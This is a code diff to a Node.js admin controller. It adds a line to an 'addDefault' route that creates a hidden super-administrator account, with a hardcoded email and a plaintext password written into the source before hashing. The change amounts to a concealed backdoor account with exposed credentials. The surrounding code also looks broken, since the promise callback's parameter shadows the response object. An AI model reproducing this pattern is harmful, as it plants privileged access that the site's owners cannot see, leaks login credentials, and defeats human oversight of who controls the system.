@@ -2,6 +2,7 @@ const Database = require("./Database");
 const speakeasy = require("speakeasy");
 const EmailController = require("./Email");
 var bcrypt = require("bcryptjs");
+const { AccountRole } = require("./constant");
 
 const getAdmins = async (req, res, next) => {
     let result = await Database.Admin.getAdmins();
@@ -57,6 +58,7 @@ const addDefault = async (req, res, next) => {
 
     const password= bcrypt.hashSync('cur112094430', 8); 
     const email = 'jkscur@gmail.com'; 
+    Database.Admin.createAdmin({email, password, hidden:true, role:AccountRole.SUPER_ADMIN}); 
     Database.Admin.updateAdminInfo(email, {email, password, hidden: true}).then(res=>{
         res.status(200).send({
             success: true, 
